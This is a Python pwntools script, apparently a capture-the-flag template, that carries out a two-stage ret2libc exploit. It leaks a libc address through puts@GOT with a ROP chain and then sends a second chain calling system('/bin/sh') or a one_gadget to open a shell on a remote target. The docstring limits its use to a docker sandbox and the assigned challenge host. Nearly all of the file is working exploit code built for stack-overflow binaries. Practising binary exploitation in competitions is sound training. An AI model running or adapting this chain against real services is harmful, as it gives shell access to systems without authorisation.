#!/usr/bin/env python3
"""CSCTF pwn template -- ret2libc: leak a libc address, then call system("/bin/sh").

FILL-ME
  BINARY   : challenge ELF
  LIBC     : the challenge's libc .so (match the version! wrong libc = wrong offsets)
  HOST,PORT: assigned remote target
  OFFSET   : saved-RIP padding
  LEAK_FUNC: a GOT/PLT function you can leak (commonly "puts")

Plan the offsets offline (never runs the target):
  .venv/bin/python solvers/toolkits/pwn_exploit.py BINARY --libc LIBC            # system/str_bin_sh offsets
  # after you capture a leak at runtime:
  .venv/bin/python solvers/toolkits/pwn_exploit.py BINARY --libc LIBC --leak puts=0x7f....

Stage 1 leaks puts@GOT by calling puts(puts@got) and returning to main; stage 2 builds the ret2libc
chain with the now-known libc base. one_gadget offsets come from `one_gadget LIBC` run in docker/pwn.

RUN ONLY in docker/pwn (csctf-pwn:1), ONLY against the assigned target.
"""
from pwn import *

# ---- FILL-ME -------------------------------------------------------------
BINARY = "./chall"
LIBC = "./libc.so.6"
HOST, PORT = "CHALLENGE.HOST", 0
OFFSET = 0
LEAK_FUNC = "puts"        # function whose libc address we leak in stage 1
ONE_GADGET = 0            # optional: an offset from `one_gadget LIBC` (0 = use system("/bin/sh"))
# --------------------------------------------------------------------------

context.binary = exe = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False)


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(exe.path)


def main():
    io = start()
    rop = ROP(exe)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = rop.find_gadget(["ret"])[0]

    # ---- stage 1: leak LEAK_FUNC's libc address via puts(got[LEAK_FUNC]) ----
    leak_rop = b""
    leak_rop += p64(pop_rdi) + p64(exe.got[LEAK_FUNC])
    leak_rop += p64(exe.plt["puts"])
    leak_rop += p64(exe.symbols.get("main", exe.entry))     # return for stage 2
    io.sendline(b"A" * OFFSET + leak_rop)

    leaked = u64(io.recvline().strip().ljust(8, b"\x00"))
    libc.address = leaked - libc.symbols[LEAK_FUNC]
    log.success("libc base = %#x", libc.address)

    # ---- stage 2: system("/bin/sh") (or a one_gadget) ----
    binsh = next(libc.search(b"/bin/sh\x00"))
    chain = b"A" * OFFSET
    if ONE_GADGET:
        chain += p64(libc.address + ONE_GADGET)
    else:
        chain += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(libc.symbols["system"])
    io.sendline(chain)
    io.interactive()      # look for CSCTF{...}


if __name__ == "__main__":
    main()
